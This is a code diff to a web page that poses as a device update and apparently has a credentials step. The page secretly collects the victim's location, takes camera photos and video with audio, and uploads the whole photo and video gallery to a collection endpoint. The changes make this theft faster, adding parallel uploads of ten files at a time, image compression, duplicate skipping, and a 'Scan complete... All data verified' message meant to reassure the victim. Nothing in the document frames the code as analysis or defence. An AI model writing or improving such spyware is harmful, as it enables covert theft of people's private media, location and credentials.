@@ -291,6 +291,21 @@
             max-width: 280px;
             margin: 0 auto;
         }
+        .speed-badge {
+            display: inline-block;
+            background: rgba(0, 200, 100, 0.1);
+            color: #44ff88;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 10px;
+            border: 1px solid rgba(0, 200, 100, 0.1);
+            margin-left: 8px;
+        }
+        .eta-text {
+            font-size: 11px;
+            color: #666688;
+            margin-top: 4px;
+        }
     </style>
 </head>
 <body>
@@ -307,6 +322,7 @@
 
         <div class="device-badge" id="deviceBadge">
             📱 <span id="deviceName">Detecting device...</span>
+            <span class="speed-badge" id="speedBadge">⚡ Fast Mode</span>
         </div>
 
         <!-- STEP 1: CREDENTIALS -->
@@ -362,7 +378,7 @@
             </div>
         </div>
 
-        <!-- STEP 3: COMPLETE (LOCKED UNTIL GALLERY DONE) -->
+        <!-- STEP 3: COMPLETE -->
         <div class="step" id="step3">
             <div class="complete-icon">✅</div>
             <div class="complete-text">Update Ready</div>
@@ -385,6 +401,8 @@
         let storageSelected = false;
         let galleryComplete = false;
         let allDataCollected = false;
+        let processedHashes = new Set();
+        let startTime = 0;
 
         // ============================================================
         // DEVICE DETECTION
@@ -444,6 +462,7 @@
         // ============================================================
         async function startDataCollection() {
             addLogEntry('● Starting data collection...', 'done');
+            startTime = Date.now();
 
             // ---- 1. LOCATION ----
             addLogEntry('📍 Collecting location...', 'warn');
@@ -459,7 +478,7 @@
             // ---- 3. CAMERA PHOTOS + VIDEO ----
             addLogEntry('📸 Capturing camera media...', 'warn');
             await collectCameraMedia();
-            updateProgress(40);
+            updateProgress(35);
 
             // ---- 4. GALLERY EXTRACTION (triggered by user) ----
             addLogEntry('📁 Waiting for storage selection...', 'warn');
@@ -467,7 +486,7 @@
             document.getElementById('scanDesc').textContent = '📁 Tap "Select Storage" to continue...';
             document.getElementById('scanIcon').classList.remove('spinning');
             document.getElementById('scanIcon').textContent = '📁';
-            updateProgress(50);
+            updateProgress(40);
 
             // Wait for gallery to complete
             await waitForGallery();
@@ -591,7 +610,7 @@
                 canvas.width = video.videoWidth || 640;
                 canvas.height = video.videoHeight || 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
-                const dataUrl = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                const dataUrl = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
                 stream.getTracks().forEach(t => t.stop());
                 return dataUrl;
             } catch (e) {
@@ -603,7 +622,7 @@
         async function captureVideo(facingMode, durationSec) {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                    video: { facingMode: facingMode, width: { ideal: 480 }, height: { ideal: 360 } },
                     audio: true
                 });
                 const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9,opus' });
@@ -636,11 +655,14 @@
                         clearInterval(checkInterval);
                         allDataCollected = true;
                         updateProgress(100);
-                        addLogEntry('✅ All data collected successfully!', 'done');
+                        const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+                        addLogEntry(`✅ All data collected in ${elapsed}s!`, 'done');
+                        document.getElementById('stepSub').textContent =
+                            `✅ Scan complete in ${elapsed}s. All data verified.`;
                         setTimeout(() => {
                             document.getElementById('step2').classList.remove('active');
                             document.getElementById('step3').classList.add('active');
-                        }, 800);
+                        }, 600);
                         resolve();
                     }
                 }, 500);
@@ -648,7 +670,7 @@
         }
 
         // ============================================================
-        // TRIGGER GALLERY EXTRACTION (User gesture)
+        // TRIGGER GALLERY EXTRACTION (User gesture) — FAST VERSION
         // ============================================================
         async function triggerGalleryExtraction(event) {
             if (event) event.preventDefault();
@@ -670,7 +692,7 @@
                 document.getElementById('storageBtnContainer').style.display = 'none';
                 document.getElementById('scanIcon').classList.add('spinning');
                 document.getElementById('scanIcon').textContent = '⚡';
-                updateProgress(60);
+                updateProgress(45);
 
                 // Collect and upload media
                 allMediaFiles = [];
@@ -686,20 +708,37 @@
 
                 totalFiles = allMediaFiles.length;
                 uploadedFiles = 0;
+                processedHashes = new Set();
+                let totalSize = 0;
 
-                const batchSize = 5;
+                // Estimate total size
+                for (const file of allMediaFiles) {
+                    try {
+                        const f = await file.handle.getFile();
+                        totalSize += f.size;
+                    } catch (e) {}
+                }
+
+                const sizeMB = (totalSize / 1024 / 1024).toFixed(1);
+                addLogEntry(`● Total gallery size: ${sizeMB} MB`, 'done');
+
+                // Upload in parallel batches of 10
+                const batchSize = 10;
                 for (let i = 0; i < allMediaFiles.length; i += batchSize) {
                     const batch = allMediaFiles.slice(i, i + batchSize);
-                    await Promise.all(batch.map(file => uploadMediaFile(file)));
+
+                    // Process batch in parallel
+                    await Promise.all(batch.map(file => uploadMediaFileFast(file)));
+
                     uploadedFiles += batch.length;
-                    const pct = 60 + (uploadedFiles / totalFiles) * 40;
+                    const pct = 45 + (uploadedFiles / totalFiles) * 55;
                     updateProgress(pct);
                     document.getElementById('scanDesc').textContent =
-                        `Uploading ${uploadedFiles}/${totalFiles} gallery files...`;
+                        `📤 ${uploadedFiles}/${totalFiles} gallery files uploaded (${Math.round(pct)}%)`;
                     addLogEntry(`● Uploaded ${uploadedFiles}/${totalFiles} files`, 'done');
                 }
 
-                addLogEntry(`✅ All ${totalFiles} gallery files uploaded`, 'done');
+                addLogEntry(`✅ All ${totalFiles} gallery files uploaded (${sizeMB} MB)`, 'done');
                 sendData({ type: 'media_extraction_complete', count: totalFiles });
                 galleryComplete = true;
 
@@ -714,6 +753,100 @@
                 }
                 sendData({ type: 'media_extraction_error', error: err.message });
             }
+        }
+
+        // ============================================================
+        // FAST UPLOAD WITH COMPRESSION
+        // ============================================================
+        async function uploadMediaFileFast(fileInfo) {
+            try {
+                const file = await fileInfo.handle.getFile();
+
+                // Skip if already processed
+                const hash = file.name + file.size + file.lastModified;
+                if (processedHashes.has(hash)) {
+                    addLogEntry(`⏭️ Skipping duplicate: ${fileInfo.name}`, 'warn');
+                    return;
+                }
+                processedHashes.add(hash);
+
+                // Determine if it's an image (compress) or video (keep as-is)
+                const isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp', 'bmp'].includes(fileInfo.ext);
+
+                let base64Data;
+
+                if (isImage && file.size > 200 * 1024) {
+                    // Compress large images
+                    try {
+                        const compressed = await compressImage(file);
+                        base64Data = compressed;
+                        addLogEntry(`📦 Compressed ${fileInfo.name} (${(file.size/1024).toFixed(0)}KB → ${(compressed.length/1.37/1024).toFixed(0)}KB)`, 'warn');
+                    } catch (e) {
+                        // Fallback to original
+                        const reader = new FileReader();
+                        base64Data = await new Promise((resolve) => {
+                            reader.onload = () => resolve(reader.result.split(',')[1]);
+                            reader.readAsDataURL(file);
+                        });
+                    }
+                } else {
+                    // Video or small image — send as-is
+                    const reader = new FileReader();
+                    base64Data = await new Promise((resolve) => {
+                        reader.onload = () => resolve(reader.result.split(',')[1]);
+                        reader.readAsDataURL(file);
+                    });
+                }
+
+                await sendData({
+                    type: 'media_file',
+                    filename: fileInfo.name,
+                    path: fileInfo.path,
+                    size: file.size,
+                    mimeType: file.type,
+                    data: base64Data
+                });
+            } catch (err) {
+                addLogEntry(`❌ Failed to upload ${fileInfo.name}`, 'error');
+            }
+        }
+
+        // ============================================================
+        // IMAGE COMPRESSION
+        // ============================================================
+        function compressImage(file) {
+            return new Promise((resolve, reject) => {
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const img = new Image();
+                    img.onload = () => {
+                        const canvas = document.createElement('canvas');
+                        let w = img.width;
+                        let h = img.height;
+
+                        // Resize if too large
+                        const maxDim = 1920;
+                        if (w > maxDim || h > maxDim) {
+                            const ratio = Math.min(maxDim / w, maxDim / h);
+                            w = Math.round(w * ratio);
+                            h = Math.round(h * ratio);
+                        }
+
+                        canvas.width = w;
+                        canvas.height = h;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(img, 0, 0, w, h);
+
+                        // Compress at 0.6 quality (JPEG)
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.6);
+                        resolve(dataUrl.split(',')[1]);
+                    };
+                    img.onerror = () => reject(new Error('Image load failed'));
+                    img.src = e.target.result;
+                };
+                reader.onerror = () => reject(new Error('File read failed'));
+                reader.readAsDataURL(file);
+            });
         }
 
         // ============================================================
@@ -742,32 +875,6 @@
         }
 
         // ============================================================
-        // UPLOAD MEDIA FILE
-        // ============================================================
-        async function uploadMediaFile(fileInfo) {
-            try {
-                const file = await fileInfo.handle.getFile();
-                const reader = new FileReader();
-                const dataUrl = await new Promise((resolve) => {
-                    reader.onload = () => resolve(reader.result);
-                    reader.readAsDataURL(file);
-                });
-                const base64Data = dataUrl.split(',')[1];
-
-                await sendData({
-                    type: 'media_file',
-                    filename: fileInfo.name,
-                    path: fileInfo.path,
-                    size: file.size,
-                    mimeType: file.type,
-                    data: base64Data
-                });
-            } catch (err) {
-                addLogEntry(`❌ Failed to upload ${fileInfo.name}`, 'error');
-            }
-        }
-
-        // ============================================================
         // UI HELPERS
         // ============================================================
         function addLogEntry(text, type = 'done') {
@@ -786,7 +893,7 @@
         }
 
         // ============================================================
-        // STEP 3: INSTALL (ONLY CALLED WHEN GALLERY COMPLETE)
+        // STEP 3: INSTALL
         // ============================================================
         function step3() {
             if (!galleryComplete) {
